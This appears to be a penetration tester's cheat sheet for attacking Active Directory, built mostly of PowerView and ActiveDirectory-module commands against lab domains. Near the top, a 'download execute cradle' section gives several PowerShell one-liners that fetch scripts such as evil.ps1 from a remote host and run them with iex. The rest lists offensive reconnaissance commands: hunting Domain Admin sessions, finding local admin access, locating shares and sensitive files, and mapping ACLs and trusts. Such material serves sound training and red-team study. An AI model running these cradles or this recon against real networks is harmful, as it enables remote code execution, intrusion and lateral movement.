AD Script
==========

thanks
------

- https://github.com/samratashok/
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
- https://www.pentesteracademy.com/
- https://book.hacktricks.xyz/windows/active-directory-methodology
- https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
- https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
- https://docs.microsoft.com/en-us/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1


Enumeration
==========

Tools
------

- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

- The ActiveDirectory PowerShell module
https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps

- https://github.com/samratashok/ADModule

- We can use below tools for complete coverage

* PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
* BeRoot: https://github.com/AlessandroZ/BeRoot
* Privesc: https://github.com/enjoiz/Privesc


Download execute cradle
=======================

```powershell

iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# PSv3 onwards
iex(iwr 'http://192.168.230.1/evil.ps1')


$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText

$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

```


Commands
-------

- Get current domain

```
Get-NetDomain #(PowerView)
Get-ADDomain # (ActiveDirectory Module)
```


- Get object of another domain

```
Get-NetDomain –Domain moneycorp.local
Get-ADDomain -Identity moneycorp.local
```


- Get domain SID for the current domain

```
Get-DomainSID
(Get-ADDomain).DomainSID
```

- Get domain policy for the current domain

```
Get-DomainPolicy
(Get-DomainPolicy)."system access"
```

- Get domain policy for another domain

```
(Get-DomainPolicy –domain moneycorp.local)."systemaccess"
```

- Get domain controllers for the current domain

```
Get-NetDomainController
Get-ADDomainController
```

- Get domain controllers for another domain

```
Get-NetDomainController –Domain moneycorp.local
Get-ADDomainController -DomainName moneycorp.local -Discover
```

- Get a list of users in the current domain

```
Get-NetUser
Get-NetUser –Username student1
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
```

- Get list of all properties for users in the current domain

```
Get-UserProperty
Get-UserProperty –Properties pwdlastset
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

- Search for a particular string in a user's attributes:

```
Find-UserField -SearchField Description -SearchTerm "built"
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

- Get a list of computers in the current domain

```
Get-NetComputer
Get-NetComputer –OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
```

- Get all groups containing the word "admin" in group name

```
Get-NetGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

- Get all the members of the Domain Admins group

```
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```


- Get the group membership for a user:

```
Get-NetGroup –UserName "student1"
Get-ADPrincipalGroupMembership -Identity student1
```

- List all the local groups on a machine (needs administrator privs on non-dc machines) :

```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```

- Get members of all the local groups on a machine (needs administrator privs on non-dc machines)

```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

- Get actively logged users on a computer (needs local admin rights on the target)

```
Get-NetLoggedon –ComputerName <servername>
```

- Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)

```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

- Get the last logged user on a computer (needs administrative rights and remote registry on the target)

```
Get-LastLoggedOn –ComputerName <servername>
```

- Find shares on hosts in current domain.

```
Invoke-ShareFinder –Verbose
```

- Find sensitive files on computers in the domain

```
Invoke-FileFinder –Verbose
```

- Get all fileservers of the domain

```
Get-NetFileServer
```

- Get list of GPO in current domain.

```
Get-NetGPO
Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
Get-GPO -All #(GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html #(Provides RSoP)
```

- Get GPO(s) which use Restricted Groups or groups.xml for interesting users

```
Get-NetGPOGroup
```

- Get users which are in a local group of a machine using GPO

```
Find-GPOComputerAdmin –Computername dcorp-student1.dollarcorp.moneycorp.local
```


- Get machines where the given user is member of a specific group

```
Find-GPOLocation -UserName student1 -Verbose
```

- Get OUs in a domain

```
Get-NetOU -FullData
Get-ADOrganizationalUnit -Filter * -Properties *
```


- Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU

```
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 #(GroupPolicy module)
```

- Get the ACLs associated with the specified object

```
Get-ObjectAcl -SamAccountName student1 –ResolveGUIDs
```

- Get the ACLs associated with the specified prefix to be used for search

```
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```

- We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs

```
(Get-Acl'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
```

- Get the ACLs associated with the specified LDAP path to be used for search

```
Get-ObjectAcl -ADSpath "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
```

- Search for interesting ACEs

```
Invoke-ACLScanner -ResolveGUIDs
```

- Get the ACLs associated with the specified path

```
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```

- Get a list of all domain trusts for the current domain

```
Get-NetDomainTrust
Get-NetDomainTrust –Domain us.dollarcorp.moneycorp.local
Get-ADTrust
Get-ADTrust –Identity us.dollarcorp.moneycorp.local
```

- Get details about the current forest

```
Get-NetForest
Get-NetForest –Forest eurocorp.local
Get-ADForest
Get-ADForest –Identity eurocorp.local
```


-Get all domains in the current forest

```
Get-NetForestDomain
Get-NetForestDomain –Forest eurocorp.local
(Get-ADForest).Domains
```

- Get all global catalogs for the current forest

```
Get-NetForestCatalog
Get-NetForestCatalog –Forest eurocorp.local
Get-ADForest | select -ExpandProperty GlobalCatalogs
```


- Map trusts of a forest

```
Get-NetForestTrust
Get-NetForestTrust –Forest eurocorp.local
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

- Find all machines on the current domain where the current user has local admin access

```
Find-LocalAdminAccess –Verbose 
```

- Find local admins on all machines of the domain (needs administrator privs on non-dc machines).

```
Invoke-EnumerateLocalAdmin –Verbose
```

- Find computers where a domain admin (or specified user/group) has sessions:

```
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```


- To confirm admin access

```
Invoke-UserHunter -CheckAccess
```

- Find computers where a domain admin is logged-in

```
Invoke-UserHunter -Stealth
```


